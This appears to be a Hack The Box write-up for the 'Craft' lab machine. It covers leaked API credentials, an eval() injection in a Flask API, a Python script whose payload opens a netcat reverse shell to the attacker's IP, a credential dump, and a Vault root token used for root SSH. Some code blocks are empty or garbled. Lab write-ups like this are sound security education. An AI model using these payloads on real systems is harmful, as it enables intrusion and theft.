## Summary

Craft just retired today. I had lots of fun solving it and I learnt about a new interesting program called `vault`. Also, I loved the Silicon Valley theme. Its IP address is `10.10.10.110` and I added it to `/etc/hosts` as `craft.htb`. Without further ado, let’s jump right in!

## Scanning & Web App Enumeration

Like most boxes, a light `nmap` offered me enough information to start exploiting this app.

{% highlight bash %}

{% endhighlight %}

Port 443 is open, meaning that a (most likely) HTTPS site is running on it. I opened `https://craft.htb` in a browser:

<div>
<center><img src="/images/craft_htb_writeup/image-17.png"></center>
</div>

In the upper right corner, I found buttons that take me to 2 different sub-domains: `api.craft.htb` and `gogs.craft.htb`. I added them to `/etc/hosts` and accessed them.

## Enumerating the 2 Sub-Domains

The first sub-domain, `api.craft.htb`, was not very interesting, because it hosted an API that could only be accessed with valid credentials.

<div>
<center><img src="/images/craft_htb_writeup/image-20.png"></center>
</div>

Before testing the API, I wanted to make sure there’s nothing easier to exploit on `gogs.craft.htb`.

<div>
<center><img src="/images/craft_htb_writeup/image-21-1024x649.png"></center>
</div>

It turned out I was right. There’s a publicly-accessible repository that contains the API’s source-code:

<div>
<center><img src="/images/craft_htb_writeup/image-22-1024x659.png"></center>
</div>

Moreover, there was an interesting issue opened:

<div>
<center><img src="/images/craft_htb_writeup/image-23-1024x566.png"></center>
</div>

{% highlight bash %}
Dinesh:
Fix is live and seems to be working :)

c414b16057

Gilfoyle:
I fixed the database schema so this is not an issue now.. Can we remove that sorry excuse for a "patch" before something awful happens?

{% endhighlight %}

I viewed the commit that contained the patch and immediately saw the vulnerability:

{% highlight bash %}
https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6

{% endhighlight %}

<div>
<center><img src="/images/craft_htb_writeup/image-24.png"></center>
</div>

The ‘patch’ uses `eval()` to check that that the ABV value (whatever that was 🙂 ) is less than 1. `eval()` should never be used on user input, because a malicious attacker could use it to gain RCE. At this moment, I knew I could get a shell if I had valid a valid username/password combo.

_Note: For those of you that are wondering, the key that Dinesh supplied in the PoC code DID NOT WORK_.

## Credentials and ‘Shell As Root’

After I started looking for credentials, it wasn’t long before I found them. As it tuned out, Dinesh initially added a test script with his credentials:

{% highlight bash %}
https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86

{% endhighlight %}

<div>
<center><img src="/images/craft_htb_writeup/image-25-1024x531.png"></center>
</div>

{% highlight python %}
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)

{% endhighlight %}

Now that I had valid credentials, I made a simple script that would spawn a reverse shell:

{% highlight python %}
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

print("Spwaning a reverse shell on port 443...")
brew_dict = {}
brew_dict['abv'] = '__import__("os").system("nc 10.10.14.156 443 -e /bin/sh &") #'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print("Done!")

{% endhighlight %}

After running the script, a reverse shell connected on port 443. I upgraded it to a tty and saw that it was `root`:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/craft# nc -nvlp 443
listening on [any] 443 ...

{% endhighlight %}

The `root` was a lie! It took me some time, but I realized that I was inside a docker container.

## GOGS Credentials & User

As I was in the app’s directory, I read the contents of `dbtest.py` in order to find the credentials for the database:

{% highlight python %}
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()

{% endhighlight %}

The credentials were stored in `craft_api/settings.py`, so I listed that file’s contents:

{% highlight python %}
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False

{% endhighlight %}

After that, I connected to the database to see if there are any credentials I could use:

{% highlight bash %}

                             db=settings.MYSQL_DATABASE_DB,

        print(result)def exec_sql(sql):

{% endhighlight %}

The database contained the following credentials:

{% highlight bash %}
dinesh 4aUh0A8PbVJxgd
ebachman llJ77D8QFkLPQB
gilfoyle ZEU3N8WNM2rh4T

{% endhighlight %}

I tried them on SSH, but they didn’t work. However, they seemed to be working on the GOGS platform. Gilfoyle had another private repository which seemed interesting:

<div>
<center><img src="/images/craft_htb_writeup/image-26.png"></center>
</div>

<div>
<center><img src="/images/craft_htb_writeup/image-27.png"></center>
</div>

I clicked on the `.ssh` folder to see if there are any keys:

<div>
<center><img src="/images/craft_htb_writeup/image-28.png"></center>
</div>

Due to my VM configuration, I couldn’t change permissions of files in the current folder, so I created the `id_rsa.gilfoyle` file in `/root/.ssh/`:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/craft# nano /root/.ssh/id_rsa.gilfoyle
root@fury-battlestation:~/htb/blog/craft# chmod 400 /root/.ssh/id_rsa.gilfoyle 
root@fury-battlestation:~/htb/blog/craft# ls -lah /root/.ssh/id_rsa.gilfoyle 
-r-------- 1 root root 1.9K Nov 10 06:35 /root/.ssh/id_rsa.gilfoyle
root@fury-battlestation:~/htb/blog/craft# ssh gilfoyle@craft.htb -i /root/.ssh/id_rsa.gilfoyle

    \_________/



Enter passphrase for key '/root/.ssh/id_rsa.gilfoyle':

{% endhighlight %}

The key is protected by a password. Fortunately, Gilfoyle reused his GOGS password, `ZEU3N8WNM2rh4T`, so I had the ability to connect to the machine:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/craft# ssh gilfoyle@craft.htb -i /root/.ssh/id_rsa.gilfoyle

The user proof starts with `bb` 🙂

## Getting Root

#### (for real, this time)

After getting the user flag, I remembered an interesting folder in the private repository named `vault`, so I checked it out:
<center><img src="/images/craft_htb_writeup/image-29.png"></center>

After some googling, I found the [application’s website](https://www.vaultproject.io/).

Basically, the system uses token to grant access to services across machines. I also found a file named `.vault-token` in the user’s home directory, so I tried to see the token’s capabilities:

{% highlight bash %}
gilfoyle@craft:~$ cat ~/.vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
gilfoyle@craft:~$ vault token capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
root
gilfoyle@craft:~$

{% endhighlight %}

The token had root privileges! This means that I could turn its privilege into a shell with the right set of commands. After more googling, I found out the exact procedure. First, I needed to authenticate:

{% highlight bash %}
gilfoyle@craft:~$ vault login -address=https://vault.craft.htb:8200 token=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
gilfoyle@craft:~$

{% endhighlight %}

After that, I connected to SSH as root using the One-Time Password (OTP) option of `vault`:

{% highlight bash %}
gilfoyle@craft:~$ vault ssh -mode otp root@localhost
WARNING: No -role specified. Use -role to tell Vault which ssh role to use for
authentication. In the future, you will need to tell Vault which role to use.
For now, Vault will attempt to guess based on the API response. This will be
removed in the Vault 1.1.
Vault SSH: Role: "root_otp"
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 7982e0d2-0391-7733-bb4e-d508ac1ddd75

The password is the OTP code given by the application a few rows up. In my case it was `7982e0d2-0391-7733-bb4e-d508ac1ddd75`.

Also, the root flag starts with `83` 😉
